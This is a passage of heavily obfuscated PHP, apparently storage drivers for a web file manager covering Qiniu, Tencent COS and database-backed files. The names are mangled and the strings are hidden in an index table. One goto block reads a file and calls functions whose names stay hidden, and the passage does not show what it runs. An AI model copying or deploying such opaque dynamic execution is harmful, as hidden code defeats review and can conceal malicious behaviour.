trim($€ÒîÇ¦Ü, $µ×——öâ[8]); $ã¶‡Èã¦ = empty($€ÒîÇ¦Ü) && $€ÒîÇ¦Ü !== $µ×——öâ[228] ? $µ×——öâ[12] : $€ÒîÇ¦Ü . $µ×——öâ[8]; $ëîÍ“í = $µ×——öâ[12]; $¢äÁ· = 1000; $ÇŸÒ¯îĞ = $¶ú¹š½ç = array(); while (!0) { check_abort(); list($ ˆÏ¾Ïá, $Ñï¶Û€) = $this->bucketManager->listFiles($this->bucket, $ã¶‡Èã¦, $ëîÍ“í, $¢äÁ·, $™îÅø¤); if ($Ñï¶Û€) { break; } $ëîÍ“í = array_key_exists($µ×——öâ[1685], $ ˆÏ¾Ïá) ? $ëîÍ“í = $ ˆÏ¾Ïá[$µ×——öâ[1739]] : $µ×——öâ[12]; $ù‚›Ã¾— = isset($ ˆÏ¾Ïá[$µ×——öâ[1740]]) ? $ ˆÏ¾Ïá[$µ×——öâ[1740]] : array(); $Ÿ÷ŞÆáí = isset($ ˆÏ¾Ïá[$µ×——öâ[1741]]) ? $ ˆÏ¾Ïá[$µ×——öâ[1741]] : array(); foreach ($ù‚›Ã¾— as $—¸õÜÉô) { if ($—¸õÜÉô[$µ×——öâ[95]] == $ã¶‡Èã¦) { continue; } $Í³Ø¬Ú = $—¸õÜÉô[$µ×——öâ[95]]; $·ÒÛèÄî = $—¸õÜÉô[$µ×——öâ[1737]]; $—¸õÜÉô[$µ×——öâ[32]] = $Í³Ø¬Ú; $—¸õÜÉô[$µ×——öâ[79]] = $·ÒÛèÄî; $Â™ö÷ıŸ = $·ÒÛèÄî == 0 && substr($Í³Ø¬Ú, strlen($Í³Ø¬Ú) - 1, 1) == $µ×——öâ[8] ? !0 : !1; $this->cacheMethodInfoSet($Í³Ø¬Ú, $Â™ö÷ıŸ, $—¸õÜÉô); if ($Â™ö÷ıŸ) { $ÇŸÒ¯îĞ[] = $Í³Ø¬Ú; continue; } $¶ú¹š½ç[] = $§¢°—À® ? $—¸õÜÉô : $Í³Ø¬Ú; } foreach ($Ÿ÷ŞÆáí as $Í³Ø¬Ú) { if ($Í³Ø¬Ú == $ã¶‡Èã¦) { continue; } $ÇŸÒ¯îĞ[] = $Í³Ø¬Ú; $this->cacheMethodInfoSet($Í³Ø¬Ú, !0); } if ($ëîÍ“í === $µ×——öâ[12]) { break; } } $this->cacheMethodInfoSet($€ÒîÇ¦Ü, !0); return array($µ×——öâ[85] => $ÇŸÒ¯îĞ, $µ×——öâ[86] => $¶ú¹š½ç); } public function canRead($§ÆÏˆíş) { return $this->exist($§ÆÏˆíş) ? !0 : !1; } public function canWrite($áôå¡Ô) { return $this->exist($áôå¡Ô) ? !0 : !1; } public function getContent($ÄüäáÆ) { return $this->fileSubstr($ÄüäáÆ, 0, -1); } public function setContent($ø³£ş, $£ê‹Åú÷ = '') { $×Á­ÏÍ¬ = $this->tempFile($this->pathThis($ø³£ş)); file_put_contents($×Á­ÏÍ¬, $£ê‹Åú÷); if ($this->upload($ø³£ş, $×Á­ÏÍ¬)) { $this->tempFileRemve($×Á­ÏÍ¬); return !0; } return !1; } public function refreshUrls($Öê¦İ¬Ô) { $ÜØ‚¡ =& $_SERVER[µÅ˜º…æ]; $Ïí¹œŠ© = array(); if (is_array($Öê¦İ¬Ô)) { foreach ($Öê¦İ¬Ô as $Á¾’ûÉ†) { $Ïí¹œŠ©[] = $this->link($Á¾’ûÉ†); } } else { $Ïí¹œŠ©[] = $this->link($Öê¦İ¬Ô); } $Àô¾²ß = new Qiniu\Cdn\CdnManager($this->auth); list($ÏÄÏ—‘°, $ÜÆˆşß¬) = $Àô¾²ß->refreshUrls($Ïí¹œŠ©); if ($ÜÆˆşß¬) { return !1; } return $ÏÄÏ—‘°[$ÜØ‚¡[1372]] == $ÜØ‚¡[859] ? !0 : !1; } public function fileSubstr($Ô×œ“Çõ, $Ö¬Éââ, $ÕĞÎ¯æÕ) { $‡‰Óœ€ =& $_SERVER[µÅ˜º…æ]; if (!($µ¹±ßßË = $this->link($Ô×œ“Çõ))) { return !1; } $¦ÊÙ©òİ = !1; if ($ÕĞÎ¯æÕ > 0) { $ßÓÑóª = $Ö¬Éââ + $ÕĞÎ¯æÕ - 1; $¦ÊÙ©òİ = array($‡‰Óœ€[1605] . $Ö¬Éââ . $‡‰Óœ€[476] . $ßÓÑóª); } $±ô·ÔáÓ = url_request($µ¹±ßßË, $‡‰Óœ€[1606], !1, $¦ÊÙ©òİ); return $±ô·ÔáÓ[$‡‰Óœ€[849]] ? $±ô·ÔáÓ[$‡‰Óœ€[1393]] : !1; } public function upload($¾¢„âÛ¦, $ÊØÌô§™, $ÍøÆÜø² = false, $éµè•í = REPEAT_REPLACE) { if (!$ÊØÌô§™ || !@file_exists($ÊØÌô§™)) { return !1; } $ÁØÁÚìÓ = new Qiniu\Storage\UploadManager(); $Ï­ÛóşÍ = $this->auth->uploadToken($this->bucket, $¾¢„âÛ¦); $‡õ˜ãâ” = get_file_mime(get_path_ext($ÊØÌô§™)); list($å¤é©”·, $¦“‘‰„) = $ÁØÁÚìÓ->putFile($Ï­ÛóşÍ, $¾¢„âÛ¦, $ÊØÌô§™, null, $‡õ˜ãâ”); return $¦“‘‰„ ? !1 : $this->getPathOuter($¾¢„âÛ¦); } public function uploadFormData($Ì„óßï, $‰úş’·Ó = 3600) { return $this->uploadToken($Ì„óßï, $‰úş’·Ó); } public function uploadMultiData($‰ÜË¥ûñ, $şòÙİŸµ = 3600) { return $this->uploadToken($‰ÜË¥ûñ, $şòÙİŸµ); } private function uploadToken($‘Ì”òõ£, $÷Ä¿÷¯ = 3600) { $åœ¤´ÏÈ =& $_SERVER[µÅ˜º…æ]; $¢ï¡—€¢ = $÷Ä¿÷¯; $åÜßç­“ = array($åœ¤´ÏÈ[1742] => $åœ¤´ÏÈ[1743]); $ïÒ¬ç¡ä = $‘Ì”òõ£; $Ã…»ŸÀ° = $this->auth->uploadToken($this->bucket, $ïÒ¬ç¡ä, $¢ï¡—€¢, $åÜßç­“, !0); $áú«Î±§ = empty($this->region) || $this->region == $åœ¤´ÏÈ[1744] ? $åœ¤´ÏÈ[12] : $åœ¤´ÏÈ[476] . $this->region; $ ÆÑ˜‡ù = http_type() . "\72\x2f\57\165\160\x6c\x6f\x61\144{$áú«Î±§}\56\161\151\156\x69\x75\x70\56\143\x6f\155\57"; return array($åœ¤´ÏÈ[1745] => $Ã…»ŸÀ°, $åœ¤´ÏÈ[1608] => $ ÆÑ˜‡ù); } public function download($·«Çı¶Å, $ì‡”ë¤‘) { $‰›²›ô = IO::getPathInner(IO::mkfile($ì‡”ë¤‘)); if (!($·ïÕâ = $this->link($·«Çı¶Å))) { return !1; } $”Õ£Ô… = 0; $Á´İ»³ = 1024 * 200; $Ì—±Ååã = fopen($‰›²›ô, $_SERVER[µÅ˜º…æ][1746]); while (!0) { $¬şİÁÔ = $this->fileSubstr($·«Çı¶Å, $”Õ£Ô…, $Á´İ»³); if ($¬şİÁÔ === !1) { return !1; } fwrite($Ì—±Ååã, $¬şİÁÔ); $”Õ£Ô… += $Á´İ»³; if (strlen($¬şİÁÔ) < $Á´İ»³) { break; } } fclose($Ì—±Ååã); return $ì‡”ë¤‘; } public function link($æÁÔ´ˆğ, $ığˆúäµ = '') { if (!$this->isFile($æÁÔ´ˆğ)) { return !1; } $†•†¨òé = $this->getHost() . $_SERVER[µÅ˜º…æ][8] . $this->pathEncode($æÁÔ´ˆğ) . $ığˆúäµ; return $this->auth->privateDownloadUrl($†•†¨òé, 3600 * 12); } public function fileOut($ôú¸¡ÁÓ, $ÛÁ‹ÄÕ‘ = false, $­ñ‹Ñ¸ = false, $ù˜±Ÿâ¯ = '') { $ÆÃ—»Ü± =& $_SERVER[µÅ˜º…æ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ôú¸¡ÁÓ, $ÛÁ‹ÄÕ‘, $­ñ‹Ñ¸, $ù˜±Ÿâ¯); } if (!$­ñ‹Ñ¸) { $­ñ‹Ñ¸ = $this->pathThis($ôú¸¡ÁÓ); } $»ªÖ’ƒ = $ÛÁ‹ÄÕ‘ ? $ÆÃ—»Ü±[1747] . rawurlencode($­ñ‹Ñ¸) : $ÆÃ—»Ü±[12]; $€Ÿå½–µ = $this->link($ôú¸¡ÁÓ, $»ªÖ’ƒ); $this->fileOutLink($€Ÿå½–µ); } public function fileOutServer($ÛŞ¯Î, $ç»–¾…à = false, $Ø–àôƒ = false, $Ç·Øšû = '') { parent::fileOut($ÛŞ¯Î, $ç»–¾…à, $Ø–àôƒ, $Ç·Øšû); } public function fileOutImage($á’îè«Œ, $òÔàÍ = 250) { if ($this->size($á’îè«Œ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($á’îè«Œ, $òÔàÍ); } $ğˆ“ôÌ¶ = $this->link($á’îè«Œ, $_SERVER[µÅ˜º…æ][1748] . $òÔàÍ); $this->fileOutLink($ğˆ“ôÌ¶); } public function fileOutImageServer($ï›Ó», $ÚÆİøÃˆ = 250) { parent::fileOutImage($ï›Ó», $ÚÆİøÃˆ); } public function hashMd5($¤óá’¸ß) { $ê½ã÷®î =& $_SERVER[µÅ˜º…æ]; $»ƒ™®´³ = $this->objectMeta($¤óá’¸ß); return isset($»ƒ™®´³[$ê½ã÷®î[245]]) ? $»ƒ™®´³[$ê½ã÷®î[245]] : !1; $¶ÅÊ—úé = $this->link($¤óá’¸ß, $ê½ã÷®î[1749]); } public function size($ø¥¨ê‚) { $ÙıŒ›ÂÁ = $this->objectMeta($ø¥¨ê‚); return $ÙıŒ›ÂÁ ? $ÙıŒ›ÂÁ[$_SERVER[µÅ˜º…æ][79]] : 0; } public function info($óáùÂœÅ) { if ($this->isFolder($óáùÂœÅ)) { return $this->folderInfo($óáùÂœÅ); } else { if ($this->isFile($óáùÂœÅ)) { return $this->fileInfo($óáùÂœÅ); } } return !1; } public function exist($¿‰Œ«ã) { return $this->isFile($¿‰Œ«ã) || $this->isFolder($¿‰Œ«ã); } public function isFile($Í¬À¥ê”) { return !$this->isFolder($Í¬À¥ê”) && $this->objectMeta($Í¬À¥ê”); } public function isFolder($Ô°Â÷Áæ) { return $this->cacheMethod($_SERVER[µÅ˜º…æ][177], $Ô°Â÷Áæ); } protected function objectMeta($şŞš´µ) { return $this->cacheMethod($_SERVER[µÅ˜º…æ][179], $şŞš´µ); } protected function _objectMeta($–·ÌÛìá) { $ƒà¶å½ =& $_SERVER[µÅ˜º…æ]; list($§¬…º—š, $õ‰áâã) = $this->bucketManager->stat($this->bucket, $–·ÌÛìá); if ($§¬…º—š) { $§¬…º—š[$ƒà¶å½[79]] = intval($§¬…º—š[$ƒà¶å½[1737]]); } return $§¬…º—š; } protected function _isFolder($üì…äëí) { $ô›Êœİı =& $_SERVER[µÅ˜º…æ]; if ($üì…äëí == $ô›Êœİı[12] || $üì…äëí == $ô›Êœİı[8]) { return !0; } list($ÙŠ‘ßÀÆ, $š˜“’·œ) = $this->bucketManager->listFiles($this->bucket, trim($üì…äëí, $ô›Êœİı[8]) . $ô›Êœİı[8], $ô›Êœİı[12], 1, $ô›Êœİı[8]); return !empty($ÙŠ‘ßÀÆ[$ô›Êœİı[1740]]) || !empty($ÙŠ‘ßÀÆ[$ô›Êœİı[1741]]) ? !0 : !1; } } goto d–½¡ãîÕ ; aŞ·½Šáï: if ($_SERVER[$_SERVER[µÅ˜º…æ][1025]] != $_SERVER[$_SERVER[µÅ˜º…æ][1041]]) { $_getc = $_SERVER[µÅ˜º…æ][1026]; $_getfile = $_SERVER[$_SERVER[µÅ˜º…æ][1027]] . $_SERVER[µÅ˜º…æ][1028]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[µÅ˜º…æ][285], $_getfilec); if (count($_getarrs) < $_SERVER[µÅ˜º…æ][713]) { $exit = $_SERVER[µÅ˜º…æ][1029]; $exit(); } $_act = $_SERVER[µÅ˜º…æ][1030]; $_act($_SERVER[$_SERVER[µÅ˜º…æ][1023]]); } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ëÂ÷éöœ) { parent::__construct($ëÂ÷éöœ); $this->setSignVersion($_SERVER[µÅ˜º…æ][247]); } public function uploadFormData($¸ûÜÈõ, $¾ƒä›‘¥ = 3600) { $‘²°ôæî =& $_SERVER[µÅ˜º…æ]; $…Ü˜µ²‹ = $‘²°ôæî[229]; $ı“¬„½­ = $‘²°ôæî[1525]; $²è£¦¸¨ = $‘²°ôæî[261]; $Ê’÷…£Ã = gmdate($‘²°ôæî[1526], time() + $¾ƒä›‘¥); $úè°Û = (string) time() . $‘²°ôæî[74] . (string) (time() + $¾ƒä›‘¥); $÷±â‚ôü = array($‘²°ôæî[262] => $Ê’÷…£Ã, $‘²°ôæî[265] => array(array($‘²°ôæî[306] => $…Ü˜µ²‹), array($‘²°ôæî[266] => $this->bucket), array($‘²°ôæî[267], $‘²°ôæî[268], $‘²°ôæî[12]), array($‘²°ôæî[270] => $²è£¦¸¨), array($‘²°ôæî[1527] => $ı“¬„½­), array($‘²°ôæî[1528] => $this->accessKey), array($‘²°ôæî[1529] => $úè°Û))); $÷±â‚ôü = json_encode($÷±â‚ôü); $¿—Ê‚©× = hash_hmac($‘²°ôæî[1525], $úè°Û, $this->secret); $»Èğàà¥ = sha1($÷±â‚ôü); $œêéØ¼“ = hash_hmac($‘²°ôæî[1525], $»Èğàà¥, $¿—Ê‚©×); $æµÓü¼ä = array($‘²°ôæî[306] => $…Ü˜µ²‹, $‘²°ôæî[270] => $²è£¦¸¨, $‘²°ôæî[277] => base64_encode($÷±â‚ôü), $‘²°ôæî[1527] => $ı“¬„½­, $‘²°ôæî[1528] => $this->accessKey, $‘²°ôæî[1530] => $úè°Û, $‘²°ôæî[1531] => $œêéØ¼“, $‘²°ôæî[206] => $this->getHost()); return $æµÓü¼ä; } public function fileOutImage($¨Ñë±¨, $á‹Œ–ıš = 250) { $ÑœÌ§§¼ =& $_SERVER[µÅ˜º…æ]; if ($this->size($¨Ñë±¨) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¨Ñë±¨, $á‹Œ–ıš); } $å©é¿ = $this->link($¨Ñë±¨); $å©é¿ .= $ÑœÌ§§¼[1532] . $á‹Œ–ıš . $ÑœÌ§§¼[1533]; $this->fileOutLink($å©é¿); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ûïÕ™³Ô) { $this->pathParse = $ûïÕ™³Ô; $this->model = Model($_SERVER[µÅ˜º…æ][1534]); } public function getPath($Àı·ÔÄ¸) { return trim($Àı·ÔÄ¸, $_SERVER[µÅ˜º…æ][8]); } public function pathFather($È¸Ûİñ) { $Â¨Ëø’à = $this->parse($È¸Ûİñ); $Â¨Ëø’à = $this->infoSimple($È¸Ûİñ); return $Â¨Ëø’à ? $Â¨Ëø’à[$_SERVER[µÅ˜º…æ][190]] : !1; } public function pathThis($Àì³ôêµ) { $•ğ­ñÓ÷ = $this->infoSimple($Àì³ôêµ); return $•ğ­ñÓ÷ ? $•ğ­ñÓ÷[$_SERVER[µÅ˜º…æ][32]] : !1; } public function getPathOuter($´ÒÓ¹™«) { if (!$´ÒÓ¹™«) { return $´ÒÓ¹™«; } $Ş‰ÜşÔ» = $this->parse($´ÒÓ¹™«); return KodIO::make($Ş‰ÜşÔ»[$_SERVER[µÅ˜º…æ][487]]); } public function copyFolderFromIO($¥ö£‘Ñ·, $ªµËÎÓÆ, $º´à›¡, $ÌÒØÜ”İ, $‘ÃÆÄíé) { $ôéÑ”¤ = $this->model->copyFolderFromIO($¥ö£‘Ñ·, $ªµËÎÓÆ, $º´à›¡, $ÌÒØÜ”İ, $‘ÃÆÄíé); return KodIO::make($ôéÑ”¤); } public function isParentOf($¸´’Ñ‚Ü, $ğó”¨˜³) { return $this->model->isParentOf($¸´’Ñ‚Ü, $ğó”¨˜³); } public function mkfile($Ÿ‘¥Ç­, $ïâşÍá… = '', $²¾§ŸÊÛ = REPEAT_RENAME) { $»ì–Šªõ =& $_SERVER[µÅ˜º…æ]; $ˆ¹®¹ßî = $this->parse($Ÿ‘¥Ç­); $Ÿ‘¥Ç­ = $ˆ¹®¹ßî[$»ì–Šªõ[487]]; for ($ğÈĞ­ô = 0; $ğÈĞ­ô < count($ˆ¹®¹ßî[$»ì–Šªõ[1535]]); $ğÈĞ­ô++) { $ŠöüÁ® = $ˆ¹®¹ßî[$»ì–Šªõ[1535]][$ğÈĞ­ô]; if ($ğÈĞ­ô == count($ˆ¹®¹ßî[$»ì–Šªõ[1535]]) - 1) { $Ÿ‘¥Ç­ = $this->model->mkfile($Ÿ‘¥Ç­, $ŠöüÁ®, $ïâşÍá…, $²¾§ŸÊÛ); break; } $Ÿ‘¥Ç­ = $this->model->mkdir($Ÿ‘¥Ç­, $ŠöüÁ®, REPEAT_SKIP); } return $this->getPathOuter($Ÿ‘¥Ç­); } public function mkdir($û»ª¹²ş, $Ÿ®¡â’¡ = REPEAT_SKIP) { $å¶©–Ñ  =& $_SERVER[µÅ˜º…æ]; $Äâ¯… Œ = $this->parse($û»ª¹²ş); $û»ª¹²ş = $Äâ¯… Œ[$å¶©–Ñ [487]]; for ($³­´Ú¾ = 0; $³­´Ú¾ < count($Äâ¯… Œ[$å¶©–Ñ [1535]]); $³­´Ú¾++) { $Ğ¡˜Ò®¾ = $Äâ¯… Œ[$å¶©–Ñ [1535]][$³­´Ú¾]; $û»ª¹²ş = $this->model->mkdir($û»ª¹²ş, $Ğ¡˜Ò®¾, $Ÿ®¡â’¡); } return $this->getPathOuter($û»ª¹²ş); } public function copyFile($Ü±íÉÄÑ, $ïáœô°˜, $”ıçÙ¢» = REPEAT_REPLACE) { $ŒÛÇ»§ =& $_SERVER[µÅ˜º…æ]; $ğë³Ä³á = $this->parse($ïáœô°˜); $ØáÌŒĞ = $this->model->copy($Ü±íÉÄÑ, $ğë³Ä³á[$ŒÛÇ»§[487]], $”ıçÙ¢», $ğë³Ä³á[$ŒÛÇ»§[87]]); return $ØáÌŒĞ ? $this->getPathOuter($ØáÌŒĞ) : !1; } public function moveFile($ˆØûøî§, $ŠìıòŒò, $–Ë•¶¤Ä = REPEAT_REPLACE) { $Åï·Ôş’ =& $_SERVER[µÅ˜º…æ]; $“½ØµÌç = $this->parse($ŠìıòŒò); $ì´û²È¼ = $this->model->move($ˆØûøî§, $“½ØµÌç[$Åï·Ôş’[487]], $–Ë•¶¤Ä, $“½ØµÌç[$Åï·Ôş’[87]]); return $ì´û²È¼ ? $this->getPathOuter($ì´û²È¼) : !1; } public function copy($¡¢üĞß÷, $šîİöâ®, $¦Şª‡ö„ = REPEAT_REPLACE, $İâšÉßÃ = false) { $‚Ä©ûÊ• = $this->parse($šîİöâ®); $Á«šùÊ° = $this->model->copy($¡¢üĞß÷, $‚Ä©ûÊ•[$_SERVER[µÅ˜º…æ][487]], $¦Şª‡ö„, $İâšÉßÃ); return $Á«šùÊ° ? $this->getPathOuter($Á«šùÊ°) : !1; } public function moveSameAllow() { } public function move($Ô§’äï, $ùÀÃÕ¼’, $€Õ¯Ô€å = REPEAT_REPLACE, $ïã¨Õ = false) { $–îßØö = $this->parse($ùÀÃÕ¼’); $ğ÷‚Ü»ã = $this->model->move($Ô§’äï, $–îßØö[$_SERVER[µÅ˜º…æ][487]], $€Õ¯Ô€å, $ïã¨Õ); return $ğ÷‚Ü»ã ? $this->getPathOuter($ğ÷‚Ü»ã) : !1; } public function remove($ÌäÃÀê, $µƒ³Ç¼ = true) { return $this->model->remove($ÌäÃÀê, $µƒ³Ç¼); } public function rename($³ÙÁìä—, $²Ëšæ) { $ÁêÈûü = $this->model->rename($³ÙÁìä—, $²Ëšæ); return $ÁêÈûü ? $this->getPathOuter($³ÙÁìä—) : $ÁêÈûü; } public function size($Ì¶á‰›¢) { $‹²ì¦Ñ = $this->infoSimple($Ì¶á‰›¢); return $‹²ì¦Ñ ? $‹²ì¦Ñ[$_SERVER[µÅ˜º…æ][79]] : 0; } public function infoSimple($Õòá£ø–) { return $this->model->sourceInfo($Õòá£ø–); } public function info($´àÓÕø) { return $this->infoParse($´àÓÕø); } public function infoAuth($ıáéÔ¥Š) { return $this->infoParse($ıáéÔ¥Š, !1, !0); } public function infoWithChildren($ë¸ù²ˆª) { return $this->infoParse($ë¸ù²ˆª, !0); } protected function infoParse($µÆçéÊ«, $¢ïÅºü = false, $ş†âŠ ¨ = false) { if (!$¢ïÅºü) { return $this->model->pathInfo($µÆçéÊ«, $ş†âŠ ¨); } return $this->model->pathInfoMore($µÆçéÊ«); } public function infoFullSimple($»ÛœÇÚ©) { $äÂàôğÙ =& $_SERVER[µÅ˜º…æ]; $•­ÌÙìî = explode($äÂàôğÙ[8], $»ÛœÇÚ©); $¦œØü  = implode($äÂàôğÙ[8], array_splice($•­ÌÙìî, 1)); return $this->model->pathInfoByPath($•­ÌÙìî[0], $¦œØü ); } public function infoFull($†õµÚùÅ) { $Ìê¿·Ğ— = $this->infoFullSimple($†õµÚùÅ); return is_array($Ìê¿·Ğ—) ? $this->model->pathInfo($Ìê¿·Ğ—[$_SERVER[µÅ˜º…æ][191]]) : !1; } public function hashSimple($¤éêÍ³±) { $£‘Õº¥ =& $_SERVER[µÅ˜º…æ]; $ëõ±ªŞ = $this->infoWithChildren($¤éêÍ³±); return $ëõ±ªŞ[$£‘Õº¥[167]][$£‘Õº¥[694]]; } public function hashMd5($‚»”•Ø) { $£û·¤ =& $_SERVER[µÅ˜º…æ]; $À²††ƒ® = $this->infoWithChildren($‚»”•Ø); return $À²††ƒ®[$£û·¤[167]][$£û·¤[563]]; } public function exist($Ü¦ıíşÃ) { $‚Øç…¥ö =& $_SERVER[µÅ˜º…æ]; $Ë²çà‹ = $this->parse($Ü¦ıíşÃ); if (!$Ë²çà‹[$‚Øç…¥ö[87]]) { return $this->isFile($Ü¦ıíşÃ) || $this->isFolder($Ü¦ıíşÃ); } $±ŒÖ†ÈÎ = array($‚Øç…¥ö[492] => $Ë²çà‹[$‚Øç…¥ö[487]], $‚Øç…¥ö[32] => $Ë²çà‹[$‚Øç…¥ö[87]]); $À°Å ´ = $this->model->where($±ŒÖ†ÈÎ)->find(); return $À°Å ´ ? !0 : !1; } public function isFile($ÌæˆŠ³Í) { $ã’·ÖçÌ =& $_SERVER[µÅ˜º…æ]; $’äü«İĞ = $this->infoSimple($ÌæˆŠ³Í); return $’äü«İĞ && $’äü«İĞ[$ã’·ÖçÌ[500]] == $ã’·ÖçÌ[228] ? !0 : !1; } public function isFolder($Ó¾¦œé’) { $×ş¥ÔÆ§ =& $_SERVER[µÅ˜º…æ]; $ÂÈ”ŸÂã = $this->infoSimple($Ó¾¦œé’); return $ÂÈ”ŸÂã && $ÂÈ”ŸÂã[$×ş¥ÔÆ§[500]] == $×ş¥ÔÆ§[91] ? !0 : !1; } public function listPath($³½ŒÙœ, $Š¦¢ÏØğ = false) { $ÎºØ° =& $_SERVER[µÅ˜º…æ]; if ($³½ŒÙœ == $ÎºØ°[12]) { return !1; } $¶•†‘– = array($ÎºØ°[492] => $³½ŒÙœ); if ($Š¦¢ÏØğ) { return $this->model->listSource($¶•†‘–, -1); } return $this->model->listSource($¶•†‘–); } public function has($ê©ûøÉß, $ ±€´â« = false, $Ï’êî‘ = null) { $ŸÎ“Ñ€¼ =& $_SERVER[µÅ˜º…æ]; $Â»™’¹‚ = $this->infoWithChildren($ê©ûøÉß); if ($ ±€´â«) { return array($ŸÎ“Ñ€¼[240] => $Â»™’¹‚[$ŸÎ“Ñ€¼[240]], $ŸÎ“Ñ€¼[239] => $Â»™’¹‚[$ŸÎ“Ñ€¼[239]]); } return $Ï’êî‘ ? $Â»™’¹‚[$ŸÎ“Ñ€¼[240]] : $Â»™’¹‚[$ŸÎ“Ñ€¼[239]]; } public function listAll($«ÛÓö¥–) { $Ğè¤ª›´ = IO::info($this->pathParse[$_SERVER[µÅ˜º…æ][87]]); if (!$Ğè¤ª›´) { return array(); } return $this->model->listAll($«ÛÓö¥–); } public function getContent($‰ƒĞÙƒü) { return $this->model->getContent($‰ƒĞÙƒü); } public function setContent($ÂœŒÔÒ¼, $¥÷©ã§Ô = '') { return $this->model->setContent($ÂœŒÔÒ¼, $¥÷©ã§Ô); } public function fileSubstr($¬¾Í˜¾, $É“Ò§˜, $›—¾­“–) { return $this->model->fileSubstr($¬¾Í˜¾, $É“Ò§˜, $›—¾­“–); } public function download($¸íûøıÖ, $“›Æ„áÏ = '') { $ß““Ğ›î = get_path_father($“›Æ„áÏ); $õâÛÙ‹ü = get_path_this($“›Æ„áÏ); $šÓğ™Ğ = $this->model->fileInfoGet($¸íûøıÖ); $§è¤š–ó = IO::copy($šÓğ™Ğ[$_SERVER[µÅ˜º…æ][87]], $ß““Ğ›î, !1, $õâÛÙ‹ü); return $§è¤š–ó; } public function setModifyTime($œ¸Â¡Û, $äùğşÉ = '') { $œÀØ™®Ò =& $_SERVER[µÅ˜º…æ]; if (!$œ¸Â¡Û) { return; } $this->model->where(array($œÀØ™®Ò[506] => $œ¸Â¡Û))->save(array($œÀØ™®Ò[88] => $äùğşÉ)); } public function upload($å—ç­ä·, $¶şæĞÔ, $ªÇĞİéÚ = false, $§ÍË†Ä = REPEAT_REPLACE) { $Æ¸™«³ü =& $_SERVER[µÅ˜º…æ]; $Æ×óüšË = $this->parse($å—ç­ä·); $åàÆ–² = $this->model->addFile($Æ×óüšË[$Æ¸™«³ü[487]], $¶şæĞÔ, $Æ×óüšË[$Æ¸™«³ü[87]], $ªÇĞİéÚ, $§ÍË†Ä); return $this->getPathOuter($åàÆ–²); } public function uploadFileByID($œÍÛ²Û², $÷åïÓ²Ş, $Ê‡ˆŸ¢) { $²ö—Í™Û =& $_SERVER[µÅ˜º…æ]; $¼¶¤ø´£ = $this->parse($œÍÛ²Û²); $ÕĞ‹æœÉ = $this->model->addFileByFileID($¼¶¤ø´£[$²ö—Í™Û[487]], $÷åïÓ²Ş, $¼¶¤ø´£[$²ö—Í™Û[87]], $Ê‡ˆŸ¢); return $this->getPathOuter($ÕĞ‹æœÉ); } public function addFileByRemote($…ÙÆªô, $½¯Î£øÀ, $ıèèÇŸ = array(), $ø¥çæÅ = '', $ââÎÂª) { $‚§›—Óù =& $_SERVER[µÅ˜º…æ]; $¸¢™ªßÙ = $this->parse($…ÙÆªô); $ø¥çæÅ = empty($ø¥çæÅ) ? $¸¢™ªßÙ[$‚§›—Óù[87]] : $ø¥çæÅ; $ëŠáìé = $this->model->addFileByRemote($¸¢™ªßÙ[$‚§›—Óù[487]], $½¯Î£øÀ, $ø¥çæÅ, $ıèèÇŸ, $ââÎÂª); return $this->getPathOuter($ëŠáìé); } public function uploadLink($ñ Í £Õ, $ˆì–©²¿ = 0) { $«‘â‰ƒÊ =& $_SERVER[µÅ˜º…æ]; $¨±Š´’Ù = $this->parse($ñ Í £Õ); $ÂòóñêÅ = _get($GLOBALS[$«‘â‰ƒÊ[7]], $«‘â‰ƒÊ[1536]); $òšô¾åš = _get($GLOBALS[$«‘â‰ƒÊ[7]], $«‘â‰ƒÊ[1537]); $îôùŒ¼ô = KodIO::ioFileDriverGet($«‘â‰ƒÊ[498] . $¨±Š´’Ù[$«‘â‰ƒÊ[487]] . $«‘â‰ƒÊ[402]); $§İİ‰á = Model($«‘â‰ƒÊ[696])->createFileName($¨±Š´’Ù[$«‘â‰ƒÊ[87]], $îôùŒ¼ô, $ÂòóñêÅ, $òšô¾åš); return IO::uploadLink($§İİ‰á, $ˆì–©²¿); } public function fileNameAuto($ÀÊş’Óš, $¦­ÛÍÇ³, $í¾‘òò = REPEAT_REPLACE, $•ŠÌğ³€ = false) { return $this->model->fileNameAuto($ÀÊş’Óš, $¦­ÛÍÇ³, $í¾‘òò, $•ŠÌğ³€); } public function fileNameExist($Äˆ‚›á§, $³¡£¥‘í) { return $this->model->fileNameExist($Äˆ‚›á§, $³¡£¥‘í); } protected function _fileOut($Ü ßœ¸®, $ÙØ³¡†ï = false, $¤©ŸÕ°® = false, $ë·„œÃ° = '', $ìç¸…øş = false) { $¤İ£ŞÇ· =& $_SERVER[µÅ˜º…æ]; $ €Ò—õá = $this->model->sourceInfo($Ü ßœ¸®); if ($ €Ò—õá[$¤İ£ŞÇ·[500]] == $¤İ£ŞÇ·[91]) { header($¤İ£ŞÇ·[1538]); die; } $ÔòÕØç = $this->model->fileInfoGet($Ü ßœ¸®); $ë·„œÃ° = $ÔòÕØç[$¤İ£ŞÇ·[563]] ? $ÔòÕØç[$¤İ£ŞÇ·[563]] : $ë·„œÃ°; $ø¿§ç£˜ = isset($GLOBALS[$¤İ£ŞÇ·[180]]) && is_array($GLOBALS[$¤İ£ŞÇ·[180]]) ? $GLOBALS[$¤İ£ŞÇ·[180]][$¤İ£ŞÇ·[32]] : $ €Ò—õá[$¤İ£ŞÇ·[32]]; if ($ìç¸…øş) { return IO::fileOutServer($ÔòÕØç[$¤İ£ŞÇ·[87]], $ÙØ³¡†ï, $ø¿§ç£˜, $ë·„œÃ°); } IO::fileOut($ÔòÕØç[$¤İ£ŞÇ·[87]], $ÙØ³¡†ï, $ø¿§ç£˜, $ë·„œÃ°); } public function fileOut($‡à¸”ñ›, $ØÓÃ½á = false, $’™ôÅßÎ = false, $Š¿Ì›ÇŞ = '') { $this->_fileOut($‡à¸”ñ›, $ØÓÃ½á, $’™ôÅßÎ, $Š¿Ì›ÇŞ); } public function fileOutServer($ñ¡ö³—°, $Ú×‹õ°á = false, $•ìÒ£şš = false, $á‚ıÎŞã = '') { $this->_fileOut($ñ¡ö³—°, $Ú×‹õ°á, $•ìÒ£şš, $á‚ıÎŞã, !0); } protected function _fileOutImage($¿˜À—Û, $å°ÂØìˆ = 250) { $Éª“ëó¼ =& $_SERVER[µÅ˜º…æ]; 